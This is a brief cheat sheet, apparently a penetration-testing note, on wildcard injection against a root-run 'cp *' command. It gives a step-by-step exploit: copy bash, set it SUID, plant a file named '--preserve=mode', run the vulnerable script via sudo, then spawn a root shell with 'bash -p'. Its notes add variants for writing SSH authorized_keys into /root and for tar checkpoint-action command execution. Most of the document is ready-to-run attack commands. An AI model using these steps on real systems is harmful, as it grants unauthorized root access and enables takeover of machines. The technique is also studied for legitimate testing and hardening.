# Wildcard Injection cp --preserve SUID Bash

When a script runs `cp .version * /target/` as root, Bash expands the `*` wildcard. A file named `--preserve=mode` is expanded as a command-line option to `cp`, causing it to preserve the file mode (including SUID bit). Combined with a SUID bash binary in the same directory, this achieves root.

## Exploit

```bash
# 1. Navigate to a writable directory (e.g., /dev/shm)
cd /dev/shm

# 2. Create .version file to pass any version checks in the script
echo 100 > .version

# 3. Copy bash and set SUID
cp /bin/bash .
chmod 4777 bash

# 4. Create file named --preserve=mode (leading -- needed)
touch -- --preserve=mode

# 5. Run the vulnerable script as sudo
sudo /usr/local/bin/vulnerable.sh
# cp expands: cp .version bash --preserve=mode /target/
# → copies bash with SUID preserved, owned by root

# 6. Execute root shell
/target/bash -p
# id → uid=<user> gid=<user> euid=0(root)
```

## Notes
- Wildcard injection: Bash expands `*` in commands, filenames starting with `-` become options
- `--preserve=mode` tells cp to preserve file permissions, including SUID
- Without `--preserve`, copied SUID binary would lose setuid because ownership changes
- Also works with `--target-directory=/root/.ssh` to write authorized_keys if dir exists
- Similar: `tar cf archive *` → inject `--checkpoint-action=exec=sh shell.sh`
